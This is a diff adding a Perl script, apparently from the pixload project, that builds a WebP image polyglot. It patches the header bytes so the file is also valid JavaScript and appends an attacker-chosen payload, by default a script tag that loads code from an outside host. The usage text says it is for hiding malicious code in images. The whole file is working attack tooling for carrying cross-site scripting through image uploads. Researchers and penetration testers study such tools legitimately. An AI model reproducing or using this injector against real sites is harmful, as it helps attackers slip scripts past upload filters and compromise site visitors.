@@ -1,0 +1,131 @@
+#!/usr/bin/env perl
+#
+# WebP Payload Creator/Injector
+#
+# coded by sighook <alexandr.savca89@gmail.com>
+# credits to Johannes Kliemann <https://jkliemann.de/>
+#            Jon Sneyers <https://sneyers.info/>
+#
+# See LICENSE file for copyright and license details.
+#
+
+use strict;
+use warnings;
+
+use feature 'say';
+
+use POSIX;
+use Getopt::Long qw(:config no_ignore_case);
+use File::Basename;
+
+use constant PROGRAM => basename $0;
+use constant VERSION => '@VERSION@';
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                              Default Options                                #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+my %opts = (
+    payload     => '<script src=//example.com></script>',
+);
+
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+#                                Subroutines                                  #
+# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+
+sub create_webp {
+    say "[>] Generating output file";
+
+    # single pixel lossy webp image
+    my $minimal_webp = "\x52\x49\x46\x46\x1a\x00\x00\x00"
+                     . "\x57\x45\x42\x50\x56\x50\x38\x4c"
+                     . "\x0d\x00\x00\x00\x2f\x00\x00\x00"
+                     . "\x10\x07\x10\x11\x11\x88\x88\xfe"
+                     . "\x07\x00";
+
+    sysopen my $fh, $opts{FILE}, O_CREAT|O_WRONLY;
+    syswrite   $fh, $minimal_webp;
+    close      $fh;
+
+    say "[✔] File saved to: $opts{FILE}\n";
+}
+
+sub inject_payload {
+    say "[>] Injecting payload into $opts{FILE}";
+
+    sysopen my $fh, $opts{FILE}, O_WRONLY;
+    sysseek    $fh, 4, SEEK_SET;
+    syswrite   $fh, "\x2f\x2a";
+
+    sysseek    $fh, 15, SEEK_SET;
+    syswrite   $fh, "\x4c\xff\xff\xff";
+
+    sysseek    $fh, 0, SEEK_END;
+
+    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
+    syswrite   $fh, $opts{payload};
+    syswrite   $fh, "\x3b";
+    close      $fh;
+
+    say "[✔] Payload was injected successfully\n";
+}
+
+sub banner {
+    <<EOF;
+..... WebP Payload Creator/Injector ......
+..........................................
+... https://github.com/sighook/pixload ...
+..........................................
+EOF
+}
+
+sub usage {
+    <<EOF;
+Usage: @{[ PROGRAM ]} [OPTION]... FILE
+Hide payloads/malicious code in WebP images.
+
+Mandatory arguments to long options are mandatory for short options too.
+  -P, --payload STRING   set payload for injection
+  -v, --version          print version and exit
+  -h, --help             print help and exit
+
+Currently, there is no possibility to inject the payload into an existing WebP
+image. Only the new (minimal) WebP image will be created and your payload will
+be injected into. If the output FILE already exists, the payload will be
+injected into the existing image, but this image will be corrupted.
+EOF
+}
+
+sub version {
+    PROGRAM . " " . VERSION;
+}
+
+sub main {
+    # command-line options
+    GetOptions(
+        'h|help!'       =>  \$opts{help},
+        'v|version!'    =>  \$opts{version},
+        'P|payload=s'   =>  \$opts{payload},
+    ) or die "$!\n";
+
+    $opts{FILE} = shift @ARGV;
+
+    say &usage    and  exit(0) if   $opts{help};
+    say &version  and  exit(0) if   $opts{version};
+    say &usage    and  exit(1) if ! $opts{FILE};
+
+    say &banner;
+
+    &create_webp if ! -f $opts{FILE};
+    &inject_payload;
+
+    if    (-f '/usr/bin/file'   ) { say `file       $opts{FILE}` }
+
+    if    (-f '/usr/bin/hexdump') { say `hexdump -C $opts{FILE}` }
+    elsif (-f '/usr/bin/xxd'    ) { say `xxd        $opts{FILE}` }
+}
+
+&main;
+
+# vim:sw=4:ts=4:sts=4:et:cc=80
+# End of file.
